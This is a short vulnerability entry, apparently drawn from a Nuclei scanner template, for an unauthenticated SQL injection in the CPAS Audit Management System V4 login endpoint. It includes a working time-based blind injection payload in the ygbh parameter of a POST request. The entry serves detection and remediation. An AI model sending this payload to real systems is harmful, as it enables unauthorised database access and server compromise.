# Vulnerability: CPAS Management System - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`cpas-managment-sqli.yaml`)

## Description
The CPAS Audit Management System V4 has been identified with an SQL injection vulnerability in the getCurserIfAllowLogin endpoint. This flaw allows unauthenticated remote attackers to exploit the system by injecting malicious SQL queries. Through this vulnerability, attackers can retrieve sensitive data from the database and, under high-privilege circumstances, upload malicious payloads such as web shells to the server. This could potentially lead to a full compromise of the server's system. The vulnerability is triggered via a crafted HTTP POST request containing a malicious ygbh parameter, making it a critical issue that requires immediate remediation to protect the integrity of the system.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /cpasm4/login HTTP/1.1
Host: {{Hostname}}

@timeout 20s
POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(7)))mlQT) AND 'qoYJ'='qoYJ
```

